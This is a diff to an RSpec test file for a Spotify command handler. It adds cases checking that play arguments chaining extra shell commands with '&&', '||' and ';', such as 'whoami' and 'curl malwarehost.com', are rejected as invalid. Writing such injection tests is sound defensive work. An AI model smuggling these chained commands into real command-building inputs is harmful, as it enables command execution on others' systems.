@@ -165,14 +165,20 @@ describe "Spotify" do
       it_behaves_like "a valid command"
     end
 
-    context "command injection" do
+    context "command injection with &&" do
       let(:play_args) { "artist Trivium && whoami" }
 
       it_behaves_like "an invalid command"
     end
 
-    context "command injection" do
+    context "command injection with ||" do
       let(:play_args) { "list some_playlist || curl malwarehost.com" }
+
+      it_behaves_like "an invalid command"
+    end
+
+    context "command injection with ;" do
+      let(:play_args) { "list some_playlist; curl malwarehost.com" }
 
       it_behaves_like "an invalid command"
     end
